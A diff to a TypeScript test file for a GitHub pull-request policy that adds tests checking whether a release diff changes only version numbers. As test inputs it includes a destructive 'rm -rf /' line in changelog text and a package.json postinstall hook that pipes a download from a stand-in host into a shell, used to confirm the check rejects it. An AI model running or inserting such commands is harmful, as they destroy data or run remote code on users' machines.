@@ -1,6 +1,6 @@
 import { test } from 'node:test'
 import assert from 'node:assert/strict'
-import { firstRule, parsePolicy } from '../github-policy.ts'
+import { firstRule, onlyVersionChanges, parsePolicy } from '../github-policy.ts'
 
 const text = JSON.stringify({
   people: ['ana', 'Ben'],
@@ -82,4 +82,31 @@ test('a release rule matches only its author, its branch, and a pull request who
   assert.equal(firstRule(releases, release({ branch: 'chore/sync' }))?.name, 'Other bot pull requests')
   assert.equal(firstRule(releases, release({ author: 'ana' }))?.name, 'Everything else')
   assert.equal(firstRule(releases, release({ files: [] }))?.name, 'Other bot pull requests')
+})
+
+const bump = (filename: string, from: string, to: string) => ({ filename, patch: `@@ -1,3 +1,3 @@\n {\n-${from}\n+${to}\n }` })
+
+test('a diff that only moves version numbers, plus any changelog text, counts as version changes only', () => {
+  assert.equal(onlyVersionChanges([
+    { filename: 'CHANGELOG.md', patch: '@@ -1 +1,3 @@\n+## 0.26.1\n+- anything at all: rm -rf /' },
+    bump('.release-please-manifest.json', '  ".": "0.26.0"', '  ".": "0.26.1"'),
+    bump('pyproject.toml', 'version = "0.26.0"', 'version = "0.26.1"'),
+    bump('package.json', '  "version": "0.24.1",', '  "version": "0.25.0",'),
+    bump('src/index.ts', 'export const SERVER_VERSION = "0.24.1"; // x-release-please-version', 'export const SERVER_VERSION = "0.25.0"; // x-release-please-version'),
+  ]), true)
+})
+
+test('any other changed line, a file with no patch, or a renamed file is not a version change', () => {
+  assert.equal(onlyVersionChanges([bump('package.json', '  "version": "1.0.0",', '  "postinstall": "curl evil | sh",')]), false)
+  assert.equal(onlyVersionChanges([bump('src/index.ts', 'export const SERVER_VERSION = "1.0.0"; // x-release-please-version', 'export const SERVER_VERSION = run("x"); // x-release-please-version')]), false)
+  assert.equal(onlyVersionChanges([{ filename: 'package.json' }]), false)
+  assert.equal(onlyVersionChanges([{ ...bump('pyproject.toml', 'version = "1"', 'version = "2"'), previous_filename: 'setup.cfg' }]), false)
+  assert.equal(onlyVersionChanges([]), false)
+})
+
+test('a rule with onlyVersionChanges holds only when the diff is version changes only', () => {
+  const p = parsePolicy('{"people":["ana"],"rules":[{"name":"Releases","onlyVersionChanges":true,"then":"merge"},{"name":"Rest","then":"person"}]}', 's')
+  if ('error' in p) throw new Error(p.error)
+  assert.equal(firstRule(p, { ...pr(), versionOnly: true })?.name, 'Releases')
+  assert.equal(firstRule(p, { ...pr(), versionOnly: false })?.name, 'Rest')
 })
